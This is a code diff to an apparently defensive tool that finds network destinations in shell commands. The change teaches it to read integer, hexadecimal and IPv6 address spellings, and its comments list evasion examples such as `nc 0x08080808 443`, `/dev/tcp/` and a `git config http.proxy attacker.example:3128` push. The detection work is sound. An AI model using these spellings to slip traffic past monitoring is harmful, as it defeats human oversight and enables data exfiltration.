@@ -967,6 +967,43 @@ const CARRIED_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
 };
 
 const IPV4_LITERAL = /^\d{1,3}(?:\.\d{1,3}){3}$/;
+
+/**
+ * An address written as one number rather than as four.
+ *
+ * `getaddrinfo` accepts an IPv4 address as a single integer and as hexadecimal, so `nc 134744072
+ * 443` and `nc 0x08080808 443` both reach 8.8.8.8. Dotted-quad was the only spelling read here -
+ * `010.010.010.010` already matched it, having four parts - so these two were a destination this
+ * could not see.
+ *
+ * The floor is what makes it usable rather than a nuisance. A bare integer is far more often a port
+ * or a count than an address, and reading every one of them carded `nc -l 8080` as 0.0.31.144 and
+ * `curl --retry 5` as 0.0.0.5 - ordinary work, on a card, which is how a floor gets switched off.
+ * Anything below 0x1000000 is an address in 0.0.0.0/8, which is "this network" and cannot be a
+ * destination, so refusing it loses no channel and takes every count and every port with it.
+ */
+const numericHost = (host: string): boolean => {
+  if (!/^(?:0[xX][0-9A-Fa-f]{1,8}|\d{1,10})$/.test(host)) return false;
+  const value = /^0[xX]/.test(host) ? Number.parseInt(host.slice(2), 16) : Number(host);
+  return value >= 0x100_0000 && value <= 0xffff_ffff;
+};
+
+/**
+ * An IPv6 literal, which is the one address whose own spelling is made of the character an
+ * authority is split on - so it has to be recognised before that split rather than after it.
+ *
+ * Bracketed is how a URL writes it and how `socat` takes it; bare is how it arrives as a shell
+ * argument, where the port is a separate token: `nc 2001:db8::1 443`. Requiring two colons keeps
+ * `docs.example.com:443` out, and allowing nothing but hex, colons and the dots of an IPv4-mapped
+ * tail keeps `TCP:attacker.example:443` out - that one is a host called `TCP` and has its own
+ * reader. A literal has no root label to strip and is returned as it is written.
+ */
+const ipv6Authority = (authority: string): [string, string] | null => {
+  const bracketed = /^\[([0-9A-Fa-f:.]+)\](?::(\d+))?$/.exec(authority);
+  if (bracketed) return [`[${bracketed[1] ?? ''}]`, bracketed[2] ?? ''];
+  if (!/^[0-9A-Fa-f:]*:[0-9A-Fa-f:]*:[0-9A-Fa-f:.]*$/.test(authority)) return null;
+  return [`[${authority}]`, ''];
+};
 /**
  * A dotted name with a top-level label that could be one: two or more characters, letter first.
  *
@@ -1067,11 +1104,12 @@ const addressFromArgument = (raw: string): string => {
   const tail = cut < 0 ? '' : token.slice(cut);
   const withUser = cut < 0 ? token : token.slice(0, cut);
   const authority = withUser.slice(withUser.lastIndexOf('@') + 1);
-  const [writtenHost = '', port = ''] = authority.split(':');
+  const six = ipv6Authority(authority);
+  const [writtenHost = '', port = ''] = six ?? authority.split(':');
   // See ROOT_LABEL. The name is normalised before it is judged and before it is returned, so the
   // card, the suffix match and the budget all read the host the resolver will actually use.
-  const host = writtenHost.length > 1 ? writtenHost.replace(ROOT_LABEL, '') : writtenHost;
-  if (!(IPV4_LITERAL.test(host) || DOTTED_NAME.test(host))) return '';
+  const host = !six && writtenHost.length > 1 ? writtenHost.replace(ROOT_LABEL, '') : writtenHost;
+  if (!six && !(IPV4_LITERAL.test(host) || numericHost(host) || DOTTED_NAME.test(host))) return '';
   try {
     return new URL(`https://${host}${/^\d+$/.test(port) ? `:${port}` : ''}${tail || '/'}`).href;
   } catch {
@@ -1490,13 +1528,12 @@ const devSocketAddresses = (text: string): string[] =>
  * 7. A HOST WITH NO DOT IN IT OTHER THAN `localhost`. `curl myserver:8080/x` on a LAN name is not
  *    read as an address; for a fetch client it is the unreadable-address card instead, and for
  *    everything else it is nothing at all.
- * 11. A NAME SPELLED AS A NUMBER. `nc 134744072 443` reaches 8.8.8.8 - `getaddrinfo` takes the
- *    32-bit integer form, verified on this box - and every IPv6 literal reaches its host:
- *    `nc 2001:4860:4860::8888 443`, `ssh me@2001:4860:4860::8888`,
- *    `socat - TCP6:[2001:4860:4860::8888]:443` and `/dev/tcp/2001:4860:4860::8888/443` are all 0
- *    destinations. `IPV4_LITERAL` is dotted-quad only, and the authority is split on `:`, which an
- *    IPv6 literal is made of. A fetch client is the exception in both cases and only because the
- *    literal scan reads the URL it wrote: `curl http://[2001:4860:4860::8888]/x` cards at 24.
+ * 11. A PORT OR A COUNT, deliberately, which is what is left of this entry. A name spelled as a
+ *    number is closed: `numericHost` reads the 32-bit integer and hexadecimal forms `getaddrinfo`
+ *    accepts, and `ipv6Authority` reads a literal bracketed or bare, before the split on `:` that
+ *    an IPv6 address is made of. What is refused is any integer below 0x1000000, because reading
+ *    every bare number carded `nc -l 8080` as 0.0.31.144 and `curl --retry 5` as 0.0.0.5 - and
+ *    an address that small is in 0.0.0.0/8, which cannot be a destination, so nothing is lost.
  * 12. A PROXY IN CONFIGURATION rather than in the command or its environment.
  *    `git config http.proxy attacker.example:3128 && git push` is 0 destinations, because the far
  *    end is in a file this never reads and `git` is deliberately unread anyway - see the note on
